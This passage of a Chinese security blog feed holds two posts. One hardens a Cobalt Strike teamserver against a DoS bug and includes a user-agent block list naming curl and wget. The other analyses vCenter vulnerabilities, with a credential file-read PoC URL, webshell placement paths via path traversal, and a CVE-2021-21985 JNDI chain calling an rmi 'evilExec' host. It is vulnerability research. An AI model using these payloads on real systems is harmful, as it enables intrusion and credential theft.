    <content type="html"><![CDATA[<p>官方通告说在CobaltStrike4.4版本中修复了一个DoS漏洞Hotcobalt（CVE-2021-36798），跟随参考链接看了sentinel labs的分析。总结就是beacon建立连接后，在解析Screenshot和Keylogger功能返回的数据时，没有对被控客户端返回的数据中声明的文件大小这个值做校验，导致后续申请内存空间时的大小是被控客户端可控的，可以被用来一直申请内存直到占满宕机。</p><p>由于一些众所周之的原因，现在没法更新4.4版本，更不可能补丁对比。但是5年前3.5版本的RCE漏洞其实跟这个有点类似（downloads时ip的位置被控客户端可控，可以被替换为<code>../</code>路径穿越），官方当时的修复措施之一就是判断了beacon在download前有没有过至少一次交互：</p><blockquote><p>The Team Server now checks that the beacon has been tasked at least once before allowing most callback responses from the beacon. This ensures that an attacker can’t stage a fake beacon and start spoofing responses without the operator first interacting with the beacon.</p></blockquote><p>大概猜了下关键字然后全局搜索，在BeaconC2.java中看到了相关判断代码：</p><p><img src="/img/gyxfhcxf_a.png"></p><p>CobaltStrikeParser模拟的beacon上线一般没有实际命令交互的，就能被这个判断给拦下来，把这段代码复制到漏洞相关的分支即可：</p><p><img src="/img/gyxfhcxf_b.png"></p><p>重新编译后测试上线可以正常使用截图功能：</p><p><img src="/img/gyxfhcxf_c.png"></p><ul><li>惭愧的是虽然看上去是这么一回事，但是没有仔细去看<a href="https://github.com/Sentinel-One/CobaltStrikeParser/blob/master/extra/communication_poc.py">communication_poc.py</a>和实际打一下做试验。只是作为一个抛砖引玉的想法，说错了的话请师傅们拍砖。</li></ul><p>除了这个代码判断外，它默认用的是空UA头<code>EMPTY_UA_HEADERS = &#123;&quot;User-Agent&quot;:&quot;&quot;&#125;</code>发起请求，在profile中屏蔽掉空UA头可以起到缓解作用：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http-config &#123;</span><br><span class="line">    ...</span><br><span class="line">    set block_useragents &quot;curl*,lynx*,wget*,blank&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更进一步可以直接关掉stager这个功能，基本就断了CobaltStrikeParser这类蹭payload去解析的工具路子，但是对后渗透会有很大影响：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set host_stage &quot;false&quot;;</span><br></pre></td></tr></table></figure><p>所以可以通过启动teamserver时给添加Java层参数<code>-Xmx2048M</code>限制内存大小。当然也可以像<a href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#stager">之前</a>说的，改掉checksum8上线规则、修改默认的抑或密钥、stager下发完payload随时kill掉这些方法辅助规避payload泄漏。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.cobaltstrike.com/2021/08/04/cobalt-strike-dos-vulnerability-cve-2021-36798/">Cobalt Strike DoS Vulnerability (CVE-2021-36798)</a></p><p><a href="https://labs.sentinelone.com/hotcobalt-new-cobalt-strike-dos-vulnerability-that-lets-you-halt-operations/">Hotcobalt – New Cobalt Strike DoS Vulnerability That Lets You Halt Operations</a></p><p><a href="https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability/">Striking Back at Retired Cobalt Strike: A look at a legacy vulnerability</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;官方通告说在CobaltStrike4.4版本中修复了一个DoS漏洞Hotcobalt（CVE-2021-36798），跟随参考链接看了sentinel labs的分析。总结就是beacon建立连接后，在解析Screenshot和Keylogger功能返回的数据时，没有对被</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="CVE-2021-36798" scheme="https://hosch3n.github.io/tags/CVE-2021-36798/"/>
    
    <category term="CVE-2022-23317" scheme="https://hosch3n.github.io/tags/CVE-2022-23317/"/>
    
  </entry>
  
  <entry>
    <title>VMware vCenter漏洞分析（一）</title>
    <link href="https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-07-06T02:46:27.000Z</published>
    <updated>2022-05-11T08:28:26.789Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>vSphere Client分为UI层、Java服务层、后端层，前端通过RESTful API与基于Spring MVC和OSGI框架的Java服务层进行通信。</p><p><img src="/img/vcenterldfx_a.png"></p><p>vCenter可以安装部署至ESXi，也可以导入镜像中的OVA文件部署，漏洞环境的ISO文件可从<a href="https://blog.whsir.com/?s=%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8">此处</a>获取。需要注意的是VCSA的最小部署规格tiny（微型）需要2核10G内存300G硬盘，本文采用的方案为在ESXi的物理机上嵌套安装ESXi虚拟机，并在嵌套安装的ESXi虚拟机中安装VCSA。保持根路由与一级ESXi物理机VLAN为空（或不变/或为4095），将一级ESXi与二级ESXi的虚拟交换机设置为4095（或某个固定值），将二级ESXi中运行的VCSA接入二级虚拟交换机，并同时开启该链路上的各级交换机的混杂模式。</p><h2 id="File-Read"><a href="#File-Read" class="headerlink" title="File Read"></a>File Read</h2><p>由EAM用户运行的服务存在文件读取，Windows上可获取帐号密码。</p><p>影响版本：</p><ul><li>6.0 &lt;= vCenter Server &lt;= 6.5 f &lt; 6.5 u1</li></ul><p>POC：<code>https://1.1.1.1/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</code></p><h2 id="CVE-2021-21972"><a href="#CVE-2021-21972" class="headerlink" title="CVE-2021-21972"></a>CVE-2021-21972</h2><p>默认启用的vROps插件（com.vmware.vropspluginui.mvc）ServicesController类的uploadova接口存在未授权访问，可利用路径穿越将文件解压至特定目录实现getshell。</p><p>影响版本：</p><ul><li>7.0 &lt;= vCenter Server &lt; 7.0 U1c</li><li>6.7 &lt;= vCenter Server &lt; 6.7 U3l</li><li>6.5 1e &lt;= vCenter Server &lt; 6.5 U3n</li><li>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2</li><li>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.1.2</li></ul><p>EXP：<a href="https://www.exploit-db.com/exploits/49602">VMware vCenter Server 7.0 - Unauthenticated File Upload</a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>用root帐号ssh连上vCenter，找到vropsplugin-service.jar利用<code>python3 -m http.server 8010</code>下载到本地<a href="https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/#LV1">反编译</a>：</p><p><img src="/img/vcenterldfx_b.png"></p><p>从post上传的输入流中解析tar遍历文件，创建File类拼接目录时存在<code>../../</code>目录穿越，可将文件解压至vsphere-ui用户有权限的目录。切入该用户并查找可写目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su vsphere-ui</span><br><span class="line">find / -writable -<span class="built_in">type</span> d |&amp; grep -v <span class="string">&quot;Permission denied&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/vcenterldfx_c.png"></p><p><code>.ssh</code>可写就能上传公钥，并通过安装VCSA时通常都会开启的SSH服务连上来，但我们先看一下shadow文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /etc/shadow</span></span><br><span class="line">...</span><br><span class="line">vsphere-ui:!:18802:1:90:7:::</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>由冒号分隔的各项分别代表：</p><ul><li>用户名</li><li>哈希算法、盐、哈希密码</li><li>最后一次密码修改时间（距1970年1月1日天数）</li><li>最小密码修改间隔时间</li><li>密码过期时间</li><li>密码过期前警告时间</li><li>密码过期后宽限时间</li><li>账号失效时间</li><li>保留字段</li></ul><p>看到密码过期时间为90天，因此在安装90天后即使写入了公钥登录也会提示密码过期，需要提供原密码并修改密码：</p><p><img src="/img/vcenterldfx_d.png"></p><p>vsphere-ui用户的第二项为<code>!</code>，这表示该用户未设置密码（与空密码不同），所以也就没法修改密码。。。</p><p>写文件getshell需要充分利用各种服务，遍历找出存在有jsp的web.xml并与可写目录交叉对比：</p><p><img src="/img/vcenterldfx_e.png"></p><p>由<code>/usr/lib/vmware-vsphere-ui/server/configuration/tomcat-server.xml</code>查到监听端口为5090，再由rhttpproxy反向代理找到web访问路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep 5090 /etc/vmware-rhttpproxy/endpoints.conf.d/*</span></span><br><span class="line">/ui/healthstatus <span class="built_in">local</span> 5090 redirect allow</span><br><span class="line">/ui <span class="built_in">local</span> 5090 redirect allow</span><br></pre></td></tr></table></figure><ul><li>靠前的redirect表示将http重定向到https，后面的allow表示允许https访问</li><li><code>META-INF/MANIFEST.MF</code>中的<code>Web-ContextPath</code>也会标识web路径</li></ul><p>最后将webshell释放至<code>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/</code>目录或其子目录，即可解析并由<code>https://1.1.1.1/ui/resources/webshell.jsp</code>访问</p><p>该路径中的42并非是固定数值，会随着重装重启等行为发生改变，所以构造上传包时可以暴力批量添加，并利用解压时的容错性释放。</p><p><img src="/img/vcenterldfx_f.png"></p><p>6.7U2及之后的版本，会在服务启动时判断如果存在work目录就删除，也就是说Web是跑在内存里面的。这时对于6.7U2及更新的6.7版本可以将webshell释放至<code>/usr/lib/vmware-vsphere-ui/server/static/resources/libs/</code>目录作为后门，待其重启后会被加载运行。对于7.0版本static后面的resources会跟一串动态数字路径，能够在请求的返回包中获取到。</p><ul><li>Windows由于权限控制并不严格，可以将webshell释放至<code>C:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\</code>目录，会以system权限运行</li></ul><h2 id="CVE-2021-21985"><a href="#CVE-2021-21985" class="headerlink" title="CVE-2021-21985"></a>CVE-2021-21985</h2><p>默认启用的Virtual SAN Health Check插件（vsan-h5-client.zip）<code>/rest/*</code>接口存在未授权访问，可利用不安全的反射调用实现getshell。</p><p>影响版本：</p><ul><li>7.0 &lt;= vCenter Server &lt; 7.0 U2b</li><li>6.7 &lt;= vCenter Server &lt; 6.7 U3n</li><li>6.5 &lt;= vCenter Server &lt; 6.5 U3p</li><li>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2.1</li><li>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.2.1</li></ul><p>EXP：<a href="https://github.com/hosch3n/vCenterExp/blob/main/21985.py">vCenterExp</a></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>从官方通告能够猜到漏洞入口是vsan插件的未授权访问，为了减少干扰代码的影响，我们对漏洞修复前后的两个版本（VMware-VCSA-all-6.7.0-18010531、VMware-VCSA-all-6.7.0-17713310）进行对比分析。</p><p>挂载或解压对应ISO，将<code>VMware VCSA/vcsa</code>路径下的OVA文件导入虚拟机，由CUI开启ssh服务便于后续操作。</p><p><img src="/img/vcenterldfx_g.png"></p><p>用root帐号ssh连上vCenter，定位到vsan-h5-client插件再通过python httpserver下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find / -name &#x27;*vsan*&#x27; | grep &#x27;h5&#x27;</span></span><br><span class="line">/usr/lib/vmware-vpx/vsan-health/ui-plugins/vsan-h5-client.zip</span><br><span class="line"></span><br><span class="line">python3 -m http.server -d /usr/lib/vmware-vpx/vsan-health/ui-plugins/ 8010</span><br></pre></td></tr></table></figure><p>不是我不知道scp这个东西，photon linux的特殊结构导致了没法直接用scp传输文件：</p><p><img src="/img/vcenterldfx_h.png"></p><p>至于为什么用8010端口，是因为严格的iptables规则中这个端口在白名单里而且没被占用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># iptables -L</span></span><br><span class="line">Chain INPUT (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line">DROP       all  --  anywhere             anywhere             ctstate INVALID</span><br><span class="line">ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED</span><br><span class="line">inbound    all  --  anywhere             anywhere            </span><br><span class="line">port_filter  all  --  anywhere             anywhere            </span><br><span class="line">DROP       icmp --  anywhere             anywhere             icmp timestamp-request</span><br><span class="line">DROP       icmp --  anywhere             anywhere             icmp timestamp-reply</span><br><span class="line">ACCEPT     icmp --  anywhere             anywhere            </span><br><span class="line">DROP       udplite--  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain inbound (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">RETURN     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain port_filter (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:tungsten-https</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:ideafarm-door</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ideafarm-door</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ldap</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ldaps</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:tmosms0</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:xinupageserver</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:troff</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:shell</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:syslog</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:fujitsu-dtcns</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:5480</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:kerberos</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:kerberos</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ttyinfo</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:8010</span><br></pre></td></tr></table></figure><p>分别将两个版本的压缩包下载下来解压，IDEA对比h5-vsan-context.jar，看到新版本中对<code>/rest/*</code>路径添加了<code>authenticationFilter</code>过滤器。</p><p><img src="/img/vcenterldfx_i.png"></p><p>具体类实现中拦截了未登录的请求，并返回401状态码：</p><p><img src="/img/vcenterldfx_j.png"></p><p>另一处变动是h5-vsan-service.jar中ProxygenController类的invokeService方法，通过isAnnotationPresent判断只有方法存在<code>TsService</code>接口才会反射调用，感觉就是设置方法白名单了。</p><p><img src="/img/vcenterldfx_k.png"></p><p>invokeService方法会被<code>invokeServiceWithJson</code>或<code>invokeServiceWithMultipartFormData</code>调用，两个方法都是从URL路径中取<code>beanIdOrClassName</code>和<code>methodName</code>的值、从HTTP请求体中取<code>methodInput</code>的值，并经过格式化处理后作为入参传给invokeService方法。</p><p><img src="/img/vcenterldfx_l.png"></p><p>invokeService方法反射获取类进而注入bean，反射获取所有public方法并遍历，通过ProxygenSerializer类的deserializeMethodInput转化为方法对象后反射调用。（6.7不同小版本的代码有细微差异）</p><p><img src="/img/vcenterldfx_m.png"></p><p>由21982的分析已经知道vCenter会由rhttpproxy反代复用端口，通过<code>META-INF/MANIFEST.MF</code>和<code>web.xml</code>可以知道vsan插件部署的Web路径为<code>ui/h5-vsan/rest/*</code>，再结合各级的RequestMapping路由映射注解，推出漏洞入口就是通过<code>https://1.1.1.1/ui/h5-vsan/rest/proxy/service/&#123;beanIdOrClassName&#125;/&#123;methodName&#125;</code>触发环境中类危险方法调用。有TP5的RCE那味了，但并不可以用Runtime.exec直接莽，因为getBean时只会在<code>beanMap</code>中查找，动态调试可以看到内存中加载的Map：</p><p><img src="/img/vcenterldfx_n.png"></p><ul><li>在<code>/etc/vmware/vmware-vmon/svcCfgfiles/vsphere-ui.json</code>中添加启动参数<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8010</code>后执行<code>service-control --restart vsphere-ui</code>重启服务，IDEA中添加<code>Remote JVM Debug</code>配置<code>Attach to remote JVM</code>模式远程调试，如果不是用8010端口得开一下防火墙：<code>iptables -P INPUT ACCEPT</code></li></ul><p>所以接下来就是在一堆bean里查找危险方法构建利用链了，在<code>vsan-h5-client/plugins/h5-vsan-service/META-INF/spring/base/*.xml</code>配置文件中找到它们的定义，所有scope都是缺省的<code>singleton</code>而且没有配置<code>lazy-init</code>，也就是说这些bean都会在spring项目启动时单例加载。</p><p><img src="/img/vcenterldfx_o.png"></p><p>看到<code>org.springframework.beans.factory.config.MethodInvokingFactoryBean</code>方法和它的继承链，在<a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/config/MethodInvokingFactoryBean.html">官方API文档</a>可以清晰地看到其继承自父类MethodInvoker的多个方法：</p><p><img src="/img/vcenterldfx_p.png"></p><p>invoke方法源码如下，由<code>targetObject</code>、<code>preparedMethod</code>调用静态方法，<code>ReflectionUtils.makeAccessible</code>修改方法可见性，<code>getArguments</code>获取参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">()</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line"><span class="comment">// In the static case, target will simply be &#123;@code null&#125;.</span></span><br><span class="line">Object targetObject = getTargetObject();</span><br><span class="line">Method preparedMethod = getPreparedMethod();</span><br><span class="line"><span class="keyword">if</span> (targetObject == <span class="keyword">null</span> &amp;&amp; !Modifier.isStatic(preparedMethod.getModifiers())) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Target method must not be non-static without a target&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">ReflectionUtils.makeAccessible(preparedMethod);</span><br><span class="line"><span class="keyword">return</span> preparedMethod.invoke(targetObject, getArguments());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接调用静态方法并不需要<code>targetObject</code>，通过<code>setTargetObject</code>将其设置为null。<code>getArguments</code>取的就是<code>arguments</code>的值，可以通过<code>setArguments</code>将其设置为Obejct[]的JNDI远程方法（RMI/LDAP）。向上跟进<code>preparedMethod</code>可以看到如下反向调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">preparedMethod</span><br><span class="line">    <span class="keyword">this</span>.methodObject</span><br><span class="line">        targetClass.getMethod(targetMethod, argTypes)</span><br><span class="line">            resolveClassName(className)</span><br><span class="line">                String className = <span class="keyword">this</span>.staticMethod.substring(<span class="number">0</span>, lastDotIndex)</span><br><span class="line">                String methodName = <span class="keyword">this</span>.staticMethod.substring(lastDotIndex + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>至此这条利用链的入口和链尾已经成型：<code>&#123;beanIdOrClassName&#125;/&#123;methodName&#125; -&gt; ... -&gt; MethodInvokingFactoryBean -&gt; MethodInvoker -&gt; JNDI（javax.naming.InitialContext.doLookup） -&gt; 恶意RMI/LDAP服务器提供的远程对象</code>，搜索配置文件中class为<code>MethodInvokingFactoryBean</code>的bean就可以找到能作为连接链两端的部分：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vsanProviderUtils_setVmodlHelper</span><br><span class="line">vsanProviderUtils_setVsanServiceFactory</span><br><span class="line">vsanQueryUtil_setDataService</span><br><span class="line">vsanCapabilityUtils_setVsanCapabilityCacheManager</span><br><span class="line">vsanUtils_setMessageBundle</span><br><span class="line">vsanFormatUtils_setUserSessionService</span><br><span class="line">vsphereHealthProviderUtils_setVsphereHealthServiceFactory</span><br></pre></td></tr></table></figure><ul><li>bean配置中没写id时，name属性可以起到类似的作用</li></ul><p>直接调用FactoryBean实际上是其getObject方法返回的对象，而我们需要的是<code>MethodInvokingFactoryBean</code>自身，因此在调用这些bean时要在前面加上<code>&amp;</code>。利用bean饿汉式单例的特性，可以通过POST请求依次调用各个set方法赋值构造利用链：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&amp;&#123;beanName&#125;/setTargetObject</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[<span class="literal">null</span>]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/setStaticMethod</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[<span class="string">&quot;javax.naming.InitialContext.doLookup&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/setArguments</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[[<span class="string">&quot;rmi://1.1.1.1:1099/evilExec&quot;</span>]]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/prepare</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/invoke</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[]&#125;</span><br></pre></td></tr></table></figure><p>但。。。是。。。随着vCenter版本的不断更新，其photon linux搭载的jdk版本也在不断更新，6.7初始版本的8u71可以直接打，中间更高些jdk版本可能就需要打rmi bypass或者ldap，到漏洞修复前一个小版本jdk已经是8u281了，<del>按照刚从火星回来的我肤浅的了解，目前似乎还没有公开的byapss 8u241+的方法（这里不是太确定，说错了欢迎拍砖）</del></p><p>而且vCenter通常部署在内网深处，不一定有那么好的出网环境加载恶意方法。回顾来看目前具有调用任意类任意静态方法的能力，被反向移植的jfr包的静态方法writeGeneratedASM中存在FileOutputStream，通过java.lang.System.setProperty静态方法将<code>SAVE_GENERATED</code>设置为true，这样就能将字节数组写入指定位置的以<code>.class</code>结尾的文件中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writeGeneratedASM</span><span class="params">(String className, <span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (SAVE_GENERATED == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// We can&#x27;t calculate value statically because it will force</span></span><br><span class="line">        <span class="comment">// initialization of SecuritySupport, which cause</span></span><br><span class="line">        <span class="comment">// UnsatisfiedLinkedError on JDK 8 or non-Oracle JDKs</span></span><br><span class="line">        SAVE_GENERATED = SecuritySupport.getBooleanProperty(<span class="string">&quot;jfr.save.generated.asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (SAVE_GENERATED) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> (FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(className + <span class="string">&quot;.class&quot;</span>)) &#123;</span><br><span class="line">                fos.write(bytes);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> (FileWriter fw = <span class="keyword">new</span> FileWriter(className + <span class="string">&quot;.asm&quot;</span>); PrintWriter pw = <span class="keyword">new</span> PrintWriter(fw)) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">                CheckClassAdapter.verify(cr, <span class="keyword">true</span>, pw);</span><br><span class="line">            &#125;</span><br><span class="line">            Logger.log(LogTag.JFR_SYSTEM_BYTECODE, LogLevel.INFO, <span class="string">&quot;Instrumented code saved to &quot;</span> + className + <span class="string">&quot;.class and .asm&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Logger.log(LogTag.JFR_SYSTEM_BYTECODE, LogLevel.INFO, <span class="string">&quot;Could not save instrumented code, for &quot;</span> + className + <span class="string">&quot;.class and .asm&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但输入参数都会被ProxygenSerializer类的deserializeMethodInput方法格式化成<code>Object[]</code>，要怎么得到<code>byte[]</code>类型的参数呢。巧的是当<code>prepare</code>时<code>argTypes</code>类型不正确导致的异常，会经由以下调用栈并最终转化为需要的byte数组Orz：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.findMatchingMethod</span><br><span class="line">org.springframework.beans.support.ArgumentConvertingMethodInvoker.doFindMatchingMethod</span><br><span class="line">TypeConverter.convertIfNecessary</span><br></pre></td></tr></table></figure><p>再利用tomcat中的静态方法<a href="https://tomcat.apache.org/tomcat-8.5-doc/api/org/apache/catalina/manager/ManagerServlet.html#copyInternal-java.io.File-java.io.File-byte:A-">copyInternal</a>即可实现对写入的<code>.class</code>文件的拷贝和重命名。没有能未授权访问且解析jsp的地方时，可以利用JNI机制由System.load加载native方法调用上传的恶意so，不过如果目标不出网也不好解决命令回显的问题。</p><p>对此漏洞作者（rr yyds）利用<code>vmodlContext</code>这个bean对应类<code>com.vmware.vim.vmomi.core.types.impl.VmodContextImpl</code>（vropsplugin-service.jar）的<code>loadVmodlPackage</code>方法，会经由NonValidatingClassPathXmlApplicationContext调用父类ClassPathXmlApplicationContext的构造方法从我们可控的<code>vmodPackage</code>加载，该Spring类构造方法支持远程加载解析xml中的SpEL表达式执行命令。</p><p><img 